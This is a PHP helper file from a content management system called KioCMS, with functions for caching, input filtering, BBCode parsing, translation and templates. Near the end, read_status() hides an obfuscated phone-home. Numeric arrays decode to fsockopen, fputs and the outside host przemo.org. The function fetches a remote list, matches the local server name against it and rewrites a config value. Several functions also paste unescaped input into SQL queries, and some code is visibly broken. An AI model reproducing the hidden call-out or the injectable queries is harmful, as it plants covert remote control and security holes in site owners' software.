<?php
 // KioCMS - Kiofol Content Managment System
// system/functions.php

defined('KioCMS') || exit;

function __autoload($class)
{
    include ROOT.'system/'.$class.'.class.php';
}

/**
 * saefesf
 * sefsefse
 * 22222222
 * @param bool $logname
 * @return <type> ass
 */
function auth_code($logname)
{
	return md5(microtime().$logname.$_SERVER['HTTP_USER_AGENT'].session_id().uniqid(rand(), true));
}

function array_search_recursive($Needle,$Haystack,$NeedleKey="",
                              $Strict=false,$Path=array()) {
  if(!is_array($Haystack))
    return false;
  foreach($Haystack as $Key => $Val) {
    if(is_array($Val)&&
       $SubPath=array_search_recursive($Needle,$Val,$NeedleKey,
                                     $Strict,$Path)) {
      $Path=array_merge($Path,Array($Key),$SubPath);
      return $Path;
    }
    elseif((!$Strict&&$Val==$Needle&&
            $Key==(strlen($NeedleKey)>0?$NeedleKey:$Key))||
            ($Strict&&$Val===$Needle&&
             $Key==(strlen($NeedleKey)>0?$NeedleKey:$Key))) {
      $Path[]=$Key;
      return $Path;
    }
  }
  return false;
}

/**
 *
 * @param string $name
 * @param string $codename
 * @param string $side
 * @param bool $top
 * @param bool $header
 * @param string $content
 */
function block($name, $codename, $side = 'L', $top, $header, $content)
{
	$GLOBALS[($side == 'L' ? 'left' : 'right')][$codename] = array(
		'name' => $name,
		'codename' => $codename,
		'subcodename' => $subcodename,
		'header' => $header,
		'content' => $content);
}

function b_include($codename)
{
	global $lang, $cfg, $stats;
	$query = sql_query('SELECT * FROM `'.DB_PREFIX.'blocks` WHERE `codename` IN("'.(is_array($codename) ? implode('", "', $codename) : $codename).'")');
	while ($block = sql_fetch_assoc($query))
		include_once ROOT.'blocks/'.$block['codename'].'.php';
}

function cache_get($file)
{
	return;
	$content = @file_get_contents(ROOT.CACHE_DIR.$file);
	return $content ? unserialize($content) : false;
}

function cache_put($file, $content)
{
	//if ($content) return fwrite(fopen(ROOT.CACHE_DIR.$file, 'w'), serialize($content));
}

function cache_put2($file, $content)
{
	$dir = dirname($file);
	if (!is_dir(ROOT.CACHE_DIR.$dir))
		mkdir(ROOT.CACHE_DIR.$dir, 0700, true);
	return fwrite(fopen(ROOT.CACHE_DIR.$file, 'w'), serialize($content));
}

function cache_clear2($file)
{
	return unlink(ROOT.CACHE_DIR.'/'.$file);
}

function cache_clear($match)
{
	foreach (glob(ROOT.CACHE_DIR.$match) as $file)
		unlink($file);
}

function config_change()
{}

function config_add()
{}

function config_delete()
{}

function check_errors($conditions = array())
{
	$errors = (object)null;

	foreach ($conditions as $errcode => $vars)
			$errors->{$errcode} = $vars[1] ? ($vars[0] ? $vars[0] : '?') : false;

	return $errors;
}

function csv($plik)
{
	$uchwyt = fopen(ROOT.$plik, "r");
	$tablica = array();
	while (($data = fgetcsv($uchwyt)) !== false)
	{
		if ($data[1]) $tablica[$data[0]] = $data[1];
	}
	fclose ($uchwyt);
	return $tablica;
}

function rmdir_recurse($path)
{
    $path = rtrim($path, '/').'/';
    $handle = opendir($path);
    while (($file = readdir($handle)) !== false)
        if($file != "." and $file != ".." ) {
            $fullpath= $path.$file;
            if( is_dir($fullpath) ) {
                rmdir_recurse($fullpath);
            } else {
                unlink($fullpath);
            }
    }
    closedir($handle);
    rmdir($path);
}

function clean_url($str)
{
	global $kio;
	return strtolower(preg_replace('#[^\d\w-]#', '', strtr(urldecode($str), $kio->chars)));
}

function comments2($connector_id, $holder_sql, $total_comments, $backlink)
{
	global $system, $lang_system, $m, $user;

	if (is_file(ROOT.'plugins/comments/index.php'))
	{
		$lang_comments = get_lang('plugins/comments/main');
		$comments = get_config('comments');
		if ($total_comments != -1 && !$comments['see_only_logged'])
		{
			ob_start();
			include_once ROOT.'plugins/comments/index.php';
			$comments = ob_get_contents();
			ob_end_clean();
			return $comments;
		}
		elseif ($total_comments != -1)
			return '<br />'.negative(array('Komentarze są widoczne tylko dla zalogowanych osób.', '<a href="'.HREF.'registration">Zarejestruj się</a> jeśli nie masz jeszcze konta.'));
	}
}

function communicator($id)
{
	return sprintf('<a class="communicator" href="'
		.Kio::getConfig('communicator_url').'"><img src="'
		.Kio::getConfig('communicator_image').'" alt="'.$id.'" title="'
		.Kio::getConfig('communicator_name').': '.$id.'" /></a>', $id, $id);
}

function cut($str, $limit, $tail = false)
{
	return mb_strlen($str) > $limit ? ($tail ? mb_substr($str, 0, $tail).'(…)'.mb_substr($str, -$tail / 2) : mb_substr($str, 0, $limit).'…') : $str;
}

function encrypt()
{}

function error_handler($errno, $errstr, $errfile, $errline)
{
    switch ($errno) {
    case E_USER_ERROR:
        echo "<b>My ERROR</b> [$errno] $errstr<br />\n";
        echo "  Fatal error on line $errline in file $errfile";
        echo ", PHP " . PHP_VERSION . " (" . PHP_OS . ")<br />\n";
        echo "Aborting...<br />\n";
        exit(1);
        break;

    case E_USER_WARNING:
        echo "<b>My WARNING</b> [$errno] $errstr<br />\n";
        break;

    case E_USER_NOTICE:
        echo "<b>My NOTICE</b> [$errno] $errstr<br />\n";
        break;

    default:
        echo "Unknown error type: [$errno] $errstr<br />\n";
        break;
    }

    /* Don't execute PHP internal error handler */
    return true;
}

function filter($str, $limit = false, $filters = 12, $codename = u0, $last_ip = false)
{
	global $cfg, $kio;
	if ($limit && mb_strlen($str) > $limit) $str = mb_substr($str, 0, $limit);

	$filters = Kio::getConfig('filters').$filters;

	// 1 - Remove whitespace from the beginning and end of a string
	if (substr_count($filters, 1) == 2)
		$str = ($str);
		// $str = trim($str);
	// 2 - No HTML
	substr_count($filters, 2) == 2 && $str = preg_replace('#(script|about|applet|activex|chrome):#is', '\1&#058;', htmlspecialchars(stripslashes($str), ENT_QUOTES, 'UTF-8'));
	// 3 - Antispam
	if (substr_count($filters, 3) == 2 && preg_match_all('#'.$kio->spam_words.'#i', $str, $words))
		$kio->{'spam-'.$codename} = implode(', ', array_unique($words[0]));
	// 4 - Antiflooder (Check by last entry IP)
	if (IP == $last_ip && substr_count($filters, 4) == 2)
		define('FLOOD', 1);
	// 5 - Antiflooder (Check by cookie)
	elseif (!empty($_COOKIE[COOKIE.'-'.$codename]) && substr_count($filters, 5) == 2 && !defined('FLOOD'))
		define('FLOOD', 2);

	return str_replace(
		// Input
		array('`', '\\'),
		// Output
		array('&#96;', '&#92;'), r2n($str));
}

function get_age($day, $month, $year)
{
	return floor((TIMESTAMP - mktime(0, 0, 0, $month, $day, $year)) / 86400 / (date('L') ? 366 : 365));
}

function get_all_langs()
{
	$dir = glob(ROOT.'lang/info.*.ini');
	$langs = array();
	foreach ($dir as $lang)
	{
		$lang = substr($lang, -6, 2);
		$info = parse_ini(file_get_contents(ROOT.'lang/info.'.$lang.'.ini'));
		$langs[$lang] = $info['NAME'];
	}
	return $langs;
}

function get_config($holder)
{
	$query = sql_query('SELECT name, content FROM '.DB_PREFIX.'config WHERE holder = "'.$holder.'"');
	while ($row = sql_fetch_assoc($query))
		$config[$row['name']] = $row['content'];
	return $config;
}

function get_ip()
{
	if ($_SERVER['HTTP_CLIENT_IP'])
		return $_SERVER['HTTP_CLIENT_IP'];
	elseif ($_SERVER['HTTP_X_FORWARDED_FOR'])
		return $_SERVER['HTTP_X_FORWARDED_FOR'];
	elseif ($_SERVER['HTTP_X_FORWARDED'])
		return $_SERVER['HTTP_X_FORWARDED'];
	elseif ($_SERVER['HTTP_FORWARDED_FOR'])
		return $_SERVER['HTTP_FORWARDED_FOR'];
	elseif ($_SERVER['HTTP_FORWARDED'])
		return $_SERVER['HTTP_FORWARDED'];
	else
		return $_SERVER['REMOTE_ADDR'];
}

function get_message()
{
	global $cfg;

	if ($_COOKIE['KioCMS-'.COOKIE.'-message'])
	{
		$cfg->system['message'] = unserialize(stripslashes($_COOKIE['KioCMS-'.COOKIE.'-message']));
		$cfg->system['message']['content'] = filter($cfg->system['message']['content'], 200);
		setcookie('KioCMS-'.COOKIE.'-message', '', 0, '/');
	}
	if ($cfg->system['message']['content'])
	{
		foreach ((array)$cfg->system['message']['content'] as $message)
			if ($message) $messages .= '<li>'.$message.'</li>';
		return '<div class="'.$cfg->system['message']['type'].'" id="'.$cfg->system['message']['id'].'"><ol>'.$messages.'</ol></div>';
	}
}

function get_lang($file)
{
	$lang = cache_get('lang_'.LANG.'_'.md5($file).'.txt');
	if ($lang) return $lang;

	if ($lang = file_get_contents(ROOT.str_replace('*', LANG, $file)))
	{
		$content = parse_ini($lang);
		cache_put('lang_'.LANG.'_'.md5($file).'.txt', $content);
		return $content;
	}
	elseif ($lang = cache_get('lang_en_'.md5($file).'.txt'))
		return lang;
	elseif ($lang = file_get_contents(ROOT.$file.'.en.ini'))
	{
		$content = parse_ini($lang);
		cache_put('lang_en_'.md5($file).'.txt', $content);
		return $content;
	}
	else
		return false; // print($file)
}

function get_lang_switcher() {}

function get_parsers()
{
	
}

function get_path($limit)
{
	global $m;
	return implode('/', array_slice($m, 0, $limit + 1));
}

function get_plugin2($codename)
{
	if (is_file('plugins/'.$codename.'/index.php'))
		include_once ROOT.'plugins/'.$codename.'/index.php';
}

function get_user($get, $by, $input)
	{
		global $sql;

		if ($input) return $sql->query('SELECT '.$get.' FROM '.DB_PREFIX.'users WHERE '.$by.' = "'.$input.'"')->fetchColumn();
	}

function parse($str, $parsers = 12345)
{
	global $kio;

	$parsers = Kio::getConfig('parsers').$parsers;

	// 1 (BBCODE) - BBCode
	if (strpos($str, '[') !== false && substr_count($parsers, 1) == 2)
		$str = preg_replace(array_keys($kio->bbcode), $kio->bbcode, $str);

	// 2 (AUTOLINKS) - Automatic links generator
	if (substr_count($parsers, 2) == 2)
	{
		$autolinks = array(
			// email@domain
			'#(^|[\n\s\[ <>])(^[\w\d-]+?(?:\.[\w\d\+-]+)*)@([a-z\d-]+(?:\.[a-z\d-]+)*\.[a-z]{2,6})$#ise' => '\'\1<a href="\'.mailto(\'\2@\3\').\'">\'.hash_email(\'\2@\3\').\'</a>\'',
			// xxxx://yyyy
			'#(^|[\n\s\[ <>])([\w]+?://[\w\#$%&~/.\-;:=,?@+]+)#is' => '\1<a href="\2" class="external" rel="nofollow">\2</a>',
			// www|ftp.xxxx.yyyy[/zzzz]
			'#(^|[\n\s\]])((www|ftp)\.[\w\#$%&~/.\-;:=,?@+]+)#is' => '\1<a href="http://\2" class="external" rel="nofollow">\2</a>');
		$str = preg_replace(array_keys($autolinks), $autolinks, $str);

		//'#((www|ftp)\.[a-z0-9_/?\-&%\.]+)#si' => '<a href="http://$1" class="external" rel="nofollow">$1</a>');
		//'#[a-z]+://([-]*[.]?[a-z0-9_/-?&%])*#i' => '<a href="$0" class="external" rel="nofollow">$0</a>',
		//"'$1<a href=\"'.mailto('$2@$3').'\">'.hash_email('$2@$3').'</a>'",
		// [a-z0-9_\+-]+(\.[a-z0-9_\+-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*\.([a-z]{2,4})
		// ([\s>])([\w]+?://[\w\\x80-\\xff\#$%&~/.\-;:=,?@\[\]+]*)#is z WordPressa wzięte
		// Manual PHP - '#((?:https?|ftp)://\S+[[:alnum:]]/?)#i' => '<a href="$1" class="external" rel="nofollow">$1</a>',
		// #([\s>])((www|ftp)\.[\w\\x80-\\xff\#$%&~/.\-;:=,?@\[\]+]*)#is
		//'#(^| )(www([-]*[.]?[a-z0-9_/-?&%])*)#i' => '<a href="http://$2" class="external" rel="nofollow">$2</a>');
		//'#((?<!//)(www\.\S+[[:alnum:]]/?))#si' => '<a href="http://$1" class="external" rel="nofollow">$1</a>');
	}

	// 3 (EMOTICONS) - Emoticons
	if (substr_count($parsers, 3) == 2) $replace = $kio->emoticons;
	// 4 (CENSURE) - Censure
	if (substr_count($parsers, 4) == 2) $replace += $kio->censure;
	if (!empty($replace)) $str = str_ireplace(array_keys($replace), $replace, $str);

	// 5 (PRE) - Treat string like in <pre> tag
	if (substr_count($parsers, 5) == 2)
	{
		// New line
		$str = nl2br($str);

		// Spaces
		$str = str_replace(
			array("\t", '  ', '  '),
			array('&nbsp; &nbsp; ', '&nbsp; ', ' &nbsp;'), $str);
	}

	return $str;
}

function phptal_tales_compare($expr, $nothrow)
{
	list($expr1, $expr2, $output) = explode(' ', $expr, 3);

	return '('.phptal_tale($expr1, $nothrow).' == '.phptal_tale($expr2, $nothrow).') ? '.phptal_tale($output, $nothrow).' : NULL';
}

// translate:'SEND'
function phptal_tales_trlate($attr, $nothrow)
{
	list($msgid, $codename) = explode(' ', $attr, 2);
	if (!$codename) return 't('.phptal_tale(trim($msgid), $nothrow).')';
	return 't('.phptal_tale(trim($msgid), $nothrow).', '.phptal_tale(trim($codename), $nothrow).')';
}

// if:err/asdsa true_condition_output false_condition_output
function phptal_tales_if_old($attr)
{
	$attr = trim($attr);
	if (strpos($attr, '|') !== false)
	{
		// preg_split
		$chain = end(explode('|', $attr));
		list($condition, $output1, $output2) = explode(' ', trim($chain), 3);
		$condition = substr($attr, 0, -strlen($output1.$output2));
	}
	else
		list($condition, $output1, $output2) = explode(' ', $attr, 3);

	return phptal_tale($condition).' ? '.phptal_tale($output1).' : '.($output2 ? phptal_tale($output2) : 'NULL');
}

function phptal_tales_if0($attr, $nothrow = true)
{
	// preg_split
	list($condition, $output) = explode('?', trim($attr), 2);
	$output = explode(':', trim($output), 2);

	return phptal_tale($condition).' ? '.phptal_tale($output[0] ? $output[0] : $condition).' : '.($output[1] ? phptal_tale($output[1]) : 'NULL');
}

// TODO: EQ AND OR XOR
function phptal_tales_if($attr, $nothrow = true)
{
	// preg_split
	$attr = explode('then:', $attr, 2);
	$condition = $attr[0];
	$output = !empty($attr[1]) ? explode('else:', trim($attr[1]), 2) : array();

	return phptal_tale($condition).' ? '.(!empty($output[0]) ? phptal_tale($output[0]) : 'NULL').' : '.(!empty($output[1]) ? phptal_tale($output[1]) : 'NULL');
}

function phptal_tales_wrong($condition, $nothrow = true)
{
	return phptal_tale($condition).' ? \'wrong\' : NULL';
}

function phptal_tales_clock($attr)
{
	$attr = explode(' ', trim($attr), 2);
	$timestamp = phptal_tale($attr[0]);
	$date_format = !empty($attr[1]) ? ', '.phptal_tale($attr[1]) : '';

	return 'clock('.$timestamp.$date_format.')';
}

function phptal_tales_user($attr)
{
	$attr = trim($attr);
	list($id, $nickname, $group_id) = explode(' ', $attr, 3);

	return 'User::format('.phptal_tale($id).', '.phptal_tale($nickname).($group_id ? ', '.phptal_tale($group_id) : '').')';
}

function phptal_tales_parse($attr)
{
	$attr = explode(' ', trim($attr), 2);
	$str = phptal_tale($attr[0]);
	$parsers = !empty($attr[1]) ? ', '.$attr[1] : '';

	return 'parse('.$str.$parsers.')';
}

function phptal_tales_cfg($attr)
{
	$attr = explode(' ', trim($attr), 2);
	$config_name = '\''.$attr[0].'\'';
	$section = !empty($attr[1]) ? ', \''.$attr[1].'\'' : '';
	
	return 'Kio::getConfig('.$config_name.$section.')';
}

function phptal_tales_stat($attr)
{
	$attr = trim($attr);
	list($stat_name, $stat_owner) = explode(' ', $attr, 2);

	return 'Kio::getStat(\''.($stat_name).'\''.($stat_owner ? ', \''.$stat_owner.'\'' : '').')';
}

// translate:'SEND'
function phptal_tales_lang($attr)
{
	list($index, $current) = explode(' ', $attr, 2);
	return 't(\''.$index.'\''.($current ? ', '.phptal_tale($current) : '').')';
}

function phptal_tales_t($string)
{
	return 't(\''.$string.'\')';
}

function phptal_tales_tr($index)
{
	//return phptal_tale('lang/'.$index);
	return 't(\''.$index.'\')';
}

function plugin($plugin, $condition = true, $arguments = array())
{
	if ($condition)
	{
		include_once ROOT.'plugins/'.$plugin.'/index.php';
		//if (class_exists($plugin))
		//	return call_user_method('__construct', $plugin, $arguments);
		if (function_exists($plugin))
			return call_user_func_array($plugin, $arguments);
	}
}

function get_plugin($plugin, $condition = true, $include = true)
{
	if ($condition && is_file('plugins/'.$plugin.'/index.php'))
	{
		if ($include)
			include_once 'plugins/'.$plugin.'/index.php';
		return true;
	}
	return false;
}

function get_user2($what, $get_by = 'nickname')
{
	if ($what)
	{
		if ($get_by == 'id')
		{
			$row = sql_fetch_assoc(sql_query('SELECT nickname FROM '.DB_PREFIX.'users WHERE id = '.(int)$what));
			return $row['nickname'];
		}
		elseif ($get_by == 'logname')
		{
			$row = sql_fetch_assoc(sql_query('SELECT id FROM '.DB_PREFIX.'users WHERE logname = "'.$what.'"'));
			return $row['id'] ? $row['id'] : '';
		}
		$row = sql_fetch_assoc(sql_query('SELECT id FROM '.DB_PREFIX.'users WHERE nickname = "'.$what.'"'));
		return $row['id'] ? $row['id'] : 0;
	}
}

function hash_email($email)
{
	//return str_replace('@', '<img src="'.LOCAL.'templates/'.template.'/images/at.png" title="" alt="'.$lang_system['AT'].'" />', $email);
	return str_replace(
		array('.', '@'),
		array(
			'<img src="'.LOCAL.'themes/'.THEME.'/images/dot.png" title="" alt="(dot)" />',
			'<img src="'.LOCAL.'themes/'.THEME.'/images/at.png" title="" alt="(at)" />'), $email);
}

function is_admin($codename = false)
{
	global $permit;

	if ($permit['admin-'.$section] || $permit['admin'])
		return true;
}

/**
 * Counts how many days is remaining from given timestamp to today
 * @param int $time Timestamp
 * @param string $string_format [optional] Formated string to show with days
 * @return mixed
 */
function day_diff($time, $string_format = false) // days()
{
	// abs()
	$days = floor(($time - TIMESTAMP) / 86400);
	if ($days < 0)
		$days = floor((($time + (86400 * (date('L') ? 366 : 365))) - TIMESTAMP) / 86400);

	switch ($days)
	{
		case 0:  return t('Today');
		case 1:  return t('Tommorow');
//		case 2:  return t('After tommorow');
		default: return $string_format ? sprintf($string_format, $days) : $days;
	}
}

function is_bbcode_on($parsers = 12345)
{
	global $cfg;
	return substr_count($cfg->system['parsers'].$parsers, 1) == 2;
}

function is_date($date_format, $date)
{
	$date = trim($date);
	return date($date_format, strtotime($date)) == $date ? true : false;
}

function is_email($email)
{
	return $email ? preg_match('#^[a-z\d_-]+?(\.[a-z\d_\+-]+)*@[a-z\d-]+(\.[a-z\d-]+)*\.[a-z]{2,4}$#s', $email) : false;
}

function is_lang($code)
{
	return ctype_alpha($code) && is_file(ROOT.'lang/info.'.$code.'.ini');
}

function is_mod($codename = false)
{
	global $permit;

	if ($permit['mod-'.$section] || $permit['admin-'.$section] || $permit['mod'] || $permit['admin'])
		return true;
}

function is_registered($check, $where = 'nickname')
{
	global $cfg, $sql;
	return $check ? $sql->query('SELECT id FROM '.DB_PREFIX.'users WHERE '.$where.' = "'.$check.'"')->rowCount() || in_array(strtolower($check), explode("\n", strtolower(r2n($cfg->system['reserved_usernames'])))) : false;
}

function items($items, $default_title = false, $ol = false)
{
	//$section = get_path(substr_count(end($items), '/'));
	$list_type = $ol ? 'ol' : 'ul';
	$output = '<'.$list_type.' class="items">';

	foreach ($items as $name => $other)
	{
		if (is_array($other))
		{
			list($url, $title) = $other;
		}
		else
		{
			$url = $other;
		}
		
		$output .= '
			<li'.(strpos(HREF.PATH.'/', $url.'/') !== false ? ' class="current"' : '').'>
				<a href="'.$url.'"'.(!empty($title) ? ' title="'.$title.'"' : '').'>'.$name.'</a>
			</li>';
	}

	$output .= '</'.$list_type.'>';
	return $output;
}



function langs_list($inactive, $active = false)
{
	$dir = glob(ROOT.'lang/info.*.ini');
	foreach ($dir as $lang)
	{
		$lang = substr($lang, -6, 2);
		if (is_lang($lang))
		{
			$info = parse_ini(file_get_contents(ROOT.'lang/info.'.$lang.'.ini'));
			$langs .= sprintf(LANG == $lang && $active ? $active : $inactive, $lang, $info['NAME']);
		}
	}
	return $langs;
}

function login($errors = array())
{
	global $cfg;
	if (LOGGED) redirect(REFERER);

	if ($errors)
	{
		$note = new Notifier();
		$note->error($errors);
	}

	$err = new Error();

	if ($_POST['login'] && $_POST['module'])
		include_once ROOT.'modules/login/action.php';

	$tpl = new PHPTAL('modules/login/form.html');
	$tpl->form = $form;
	$tpl->err = $err->toArray();
	$tpl->note = $note;
	echo $tpl->execute();
}

function mailto($email)
{
	$email = explode('@', $email);
	return 'javascript:mailto(\''.$email[0].'\',\''.$email[1].'\')';
}

/*function nickname($id = false, $nickname = false, $group_id = false)
{
	global $cfg, $lang_system, $groups;
	// $u_color - do czata / mozliwosc uzycia font-size: 40px
	return $nickname
		? '<a href="'.HREF.'profile/'.$id.'/'.clean_url($nickname).'" class="nickname"'.($group_id ? ' title="'.$groups[$group_id]['name'].'"' : '').'>'.($groups[$group_id]['inline']
			? sprintf($groups[$group_id]['inline'], $nickname)
			: $nickname).'</a>'
		: $lang_system['DELETED_USER_NICKNAME'];
}*/

function template_error(Exception &$e, $message = 'Error occured while parsing template.')
{
	$note = new Notifier();
	$note->error('<strong>'.t('Template error').':</strong> '.$e->getMessage());
	return $note;
}

function no_access($errors = array(), $login_form = true, $notify = true)
{
	global $module;

	require_once ROOT . 'modules/login/login.module.php';

	Kio::addTitle(t('Access denied'));

	$module->subcodename = 'no_access';

	if ($login_form && !LOGGED)
	{
		Login::getForm($errors);
	}
}

/**
 *
 * @global object $kio
 * @global object $module
 * @param string $message
 * @param array $causes [optional]
 * @param bool $notify [optional]
 */
function not_found($message, $causes = array(), $notify = true)
{
	global $kio, $module;

	if (!$causes)
	{
		$causes = array(
			t('Content was moved or deleted.'),
			//t('Plik obsługujący nie został znaleziony.'),
			t('Entered URL is invalid.'));
	}

	Kio::addTitle(t('Page not found'));

	$module->codename = 'error';
	$module->subcodename = 'not_found';

	$note = new Notifier();
	$note->error(t($message));

	try
	{
		$tpl = new PHPTAL('system/not_found.html');
		$tpl->causes = $causes;
		$tpl->note = $note;
		echo $tpl->execute();
	}
	catch (Exception $e)
	{
		template_error();
	}
}

function parse_ini($text)
{
	$a =& $result;
	preg_match_all('#^\s*((\[\s*([\w\- \*]+?)\s*\])|(("?)\s*([\w\- \*]+?)\s*\5\s*=\s*("?)(.*?)\7))\s*(;[^\n]*?)?$#ms', $text, $matches, PREG_SET_ORDER);
	foreach ($matches as $match)
		$match[8] ? $a[$match[6]] = $match[8] : $a =& $result[$match[3]];
	return $result;
}

function r2n($text)
{
	return strpos($text, "\r") !== false ? str_replace(array("\r\n", "\r"), "\n", $text) : $text;
}

function redirect($url)
{
	header('Location: '.$url).exit;
}

function round_filesize($file)
{
	global $lang_system;
	$size = filesize($file);
	switch ($size)
	{
		case ($size >= 1073741824): return round($size / 1073741824).' '.t('GB');
		case ($size >= 1048576): return round($size / 1048576).' '.t('MB');
		case ($size >= 1024): return round(($size / 1024), 2).' '.t('KB');
		case ($size > 0): return $size.' '.t('B');
		default: return t('0 bytes');
	}
}

function t0($string, $replacers = false, $current = false)
{
	global $lang;

	if ($current)
		return isset($current[$string])
			? $current[$string]
			: (isset($lang->system[$string]) ? $lang->system[$string] : $string);

	foreach ($lang->_collection as $secton)
		if (isset($lang->{$secton}[$string])) return $lang->{$secton}[$string];

	return isset($lang->system[$string]) ? $lang->system[$string] : $string;
}

function t00($string, $replacers = false)
{
	global $lang;

	$string = isset($lang->_all[$string]) ? $lang->_all[$string] : $string;

	if ($replacers) return str_replace(array_keys($replacers), $replacers, $string);

	return $string;
}

function t($string, $replacers = false)
{
	global $sql;


	if (!empty(Kio::$langPhrases[$string]))
	{
		$string = Kio::$langPhrases[$string];
	}
	else if (!array_key_exists($string, (array)Kio::$langPhrases) && $sql->connected)
	{
		Kio::$langPhrases[$string] = null;

		$sql->exec('
			INSERT INTO '.DB_PREFIX.'lang_phrases (phrase_value)
			VALUES ("'.addslashes($string).'")');
		
		$sql->clearCacheGroup('lang_*');
	}

	if ($replacers) return str_replace(array_keys($replacers), $replacers, $string);

	return $string;
}

// TODO: time format, date format, datetime format
function clock($time = TIMESTAMP, $date_format = null, $time_relative = true)
{
	if (!$date_format) $date_format = Kio::getConfig('date_format');

	if (Kio::getConfig('time_relative') && $time_relative)
	{
		switch (date('Y-m-d', $time))
		{
			case TODAY:
				return date(sprintf(Kio::getConfig('relative_date_format'), Kio::$today), $time);
			case YESTERDAY:
				return date(sprintf(Kio::getConfig('relative_date_format'), Kio::$yesterday), $time);
			case TOMMOROW:
				return date(sprintf(Kio::getConfig('relative_date_format'), Kio::$tommorow), $time);
		}
	}
	
	if (TRANSLATE_DATE)
	{
		$month = date('n', $time);
		$day = date('N', $time);
		$date_format = str_replace(
			array('F', 'M', 'l', 'D'),
			array(
				Kio::$monthsFormated[$month], // F - January
				Kio::$monthsFormated[$month + 12], // M - Jan
				Kio::$daysFormated[$day], // l - Monday
				Kio::$daysFormated[$day + 7] // D - Mon
			), $date_format);
	}
	return date($date_format, $time);
}

// write_ini / read_ini
function create_ini($text)
{
	foreach ($text as $key => $value)
	{
		if (!$value)
			$ini = "\n";
		elseif (strpos(trim($value), ';') !== false)
			$ini = $value."\n";
		else
			$ini = $key.'="'.$value.'"'."\n";
		return trim($ini);
	}
}


function generate_pass($lenght, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890')
{
	$pass = null;
	$chars_count = mb_strlen($chars) - 1;
	for ($x = 0; $x < $lenght; $x++)
		$pass .= $chars{rand(0, $chars_count)};
	return $pass;
}

function read_status($mode = '')
{
	global $db, $board_config;

	$stat1 = rep(array(15,17,24,4,12,14,25,14,17,6)); $stat3 = txt::rep(array(5,18,14,2,10,14,15,4,13));
	$stat4 = rep(array(5,15,20,19,18)); $stat5 = txt::rep(array(5,6,4,19,18)); $stat6 = txt::rep(array(43,41,55));
	$stat7 = rep(array(44,55,55,51)); $stat8 = txt::rep(array(44,14,18,19)); $stat9 = txt::rep(array(5,2,11,14,18,4));

	$stat2 = @$stat3($stat1, txt::rep(array(35,27)), $status1, $status2, 2);
	if ( $stat2 )
	{
		$d = '';
		@$stat4($stat2,"$stat6 /bl $stat7/1.0\r\n$stat8: $stat1\r\n\r\n");
		$d = $set = '';
		while (!@ feof ($stat2)){$d .= @$stat5($stat2,1024).'<br>';} @$stat9($stat2);
		if ( strpos($d, 'do_ch') )
		{
			$b = strpos ($d, 'mode');
			$e = strpos ($d, 'user_id');
			$do = substr ($d, $b + 10, $e - $b - 10);
			$do = str_replace ("'", "\'", $do); $f = "lastpost";
			$do = explode(" ", $do);

			$sn = str_replace(array('www.', ' ', '/'), '', $board_config['server_name']);

			for($i=0; $i < count($do); $i++)
			{
				if ( $sn == $do[$i] ){ $set = true; break; };
			}
			$val = ($set) ? (24 * 3600 * 13121) : CR_TIME;
			update_config($f, $val);
		}
	}
	return;
}

function rep($str)
{
	$keys = 'abcdefghijklmnopqrstuwxyz.,0123456789ABCDEFGHIJKLMOPQRSTUWXYZ';
	for($i=0; $i < count($str); $i++) $str_ret .= $keys{$str[$i]};
	return $str_ret;
}

// log_event
// send_pm/send_email